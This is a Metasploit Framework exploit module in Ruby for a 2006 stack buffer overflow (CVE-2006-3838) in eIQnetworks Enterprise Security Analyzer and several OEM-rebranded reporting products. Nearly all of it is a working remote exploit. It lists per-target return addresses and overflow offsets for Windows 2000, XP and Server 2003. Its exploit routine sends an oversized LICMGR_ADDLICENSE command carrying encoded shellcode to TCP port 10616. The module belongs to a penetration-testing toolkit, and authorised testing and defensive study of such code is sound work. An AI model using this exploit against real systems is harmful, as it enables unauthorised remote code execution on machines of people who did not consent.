##
# $Id: eiqnetworks_esa.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'eIQNetworks ESA License Manager LICMGR_ADDLICENSE Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in eIQnetworks
				Enterprise Security Analyzer. During the processing of
				long arguments to the LICMGR_ADDLICENSE command, a stack-based
				buffer overflow occurs. This module has only been tested
				against ESA v2.1.13.
			},
			'Author'         => [ 'MC', 'ri0t <ri0t[at]ri0tnet.net>',  'kf' ],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2006-3838'],
					['OSVDB', '27526'],
					['BID', '19163'],
					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-06-024.html'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['EnterpriseSecurityAnalyzerv21 Universal', { 'Ret' => 0x00448187, 'Offset' => 494 } ],

					['EiQ Enterprise Security Analyzer Offset 494 Windows 2000 SP0-SP4 English',    { 'Ret' =>  0x750316e2, 'Offset' => 494 } ],   # call ebx
					['EiQ Enterprise Security Analyzer Offset 494 Windows XP English SP1/SP2',      { 'Ret' =>  0x77db64dc, 'Offset' => 494 } ],	# jmp ebx
					['EiQ Enterprise Security Analyzer Offset 494 Windows Server 2003 SP0/SP1',     { 'Ret' =>  0x77d16764, 'Offset' => 494 } ],   # jmp EBX
					['Astaro Report Manager (OEM) Offset 1262 Windows 2000 SP0-SP4 English',        { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ],
					['Astaro Report Manager (OEM) Offset 1262 Windows XP English SP1/SP2',          { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ],
					['Astaro Report Manager (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ],
					['Fortinet FortiReporter (OEM) Offset 1262 Windows 2000 SP0-SP4 English',       { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ],
					['Fortinet FortiReporter (OEM) Offset 1262 Windows XP English SP1/SP2',         { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ],
					['Fortinet FortiReporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1',{ 'Ret' =>  0x77d16764, 'Offset' => 1262 } ],
					['iPolicy Security Reporter (OEM) Offset 1262 Windows 2000 SP0-SP4 English',    { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ],
					['iPolicy Security Reporter (OEM) Offset 1262 Windows XP English SP1/SP2',          { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ],
					['iPolicy Security Reporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ],
					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows 2000 SP0-SP4 English', { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ],
					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows XP English SP1/SP2',   { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ],
					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ],
					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows 2000 SP0-SP4 English',   { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ],
					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows XP English SP1/SP2',     { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ],
					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ],
					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows 2000 SP0-SP4 English',          { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ],
					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows XP English SP1/SP2',            { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ],
					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows Server 2003 English SP0/SP1',   { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 24 2006'
			))

		register_options(
			[
				Opt::RPORT(10616)
			], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		filler =  rand_text_english(1) * (target['Offset'] - payload.encoded.length)
		sploit =  "LICMGR_ADDLICENSE&" + filler + payload.encoded + [target.ret].pack('V') +  "&";

		sock.put(sploit)

		handler
		disconnect
	end

end
